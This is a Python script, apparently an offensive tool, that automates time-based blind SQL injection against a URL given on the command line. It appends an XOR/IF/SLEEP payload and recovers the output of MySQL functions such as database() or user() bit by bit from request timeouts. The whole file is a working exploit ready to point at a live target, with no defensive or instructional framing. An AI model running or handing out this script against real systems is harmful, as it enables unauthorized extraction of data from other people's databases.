import requests
import time
from argparse import ArgumentParser

def checkTimeOut(url,time_):
   try:
      r = requests.get(url,timeout=time_)
   except:
      pass
      return True
   return False

def bitwise(idx,URLs,times,database,timeout):
   rlt = ''
   for pos in range(1,9): 
      payload = f"'XOR(if(substr(lpad(bin(ord(substr({database}(),{idx},1))),8,'0'),{pos},1)='1',sleep({times}),0))OR'"
      url = URLs + payload
      time_=times+1
      print (url)
      if(checkTimeOut(url,time_)):
         rlt += '1'
      else:
         rlt += '0'
   print ("Found: ",rlt, int(rlt,2),chr(int(rlt,2),))
   time.sleep(timeout)
   return int(rlt,2)

def read_config():
    parser = ArgumentParser()
    parser.add_argument("-u", "--url", help="Url target", required=True)
    parser.add_argument("-t", "--times", help="Time sleep request",default=2)
    parser.add_argument("-to", "--timeout", help="Time out per request",default=5)
    parser.add_argument("-d", "--database", help="Database Trigger exp:database,user", required=True)
    args = parser.parse_args()
    URLs = str(args.url)
    times = int(args.times)
    timeout=int(args.timeout) 
    database=str(args.database)
    return [URLs, times, database, timeout] 

if __name__ == '__main__':
    URLs, times, database, timeout = read_config()
    rlt = ''
    for idx in range(1,30):
      tmp = bitwise(idx,URLs,times,database, timeout)
      if(tmp !=127):
         rlt += chr(tmp)
      else:
         rlt += '?'
      print (rlt)
         
      
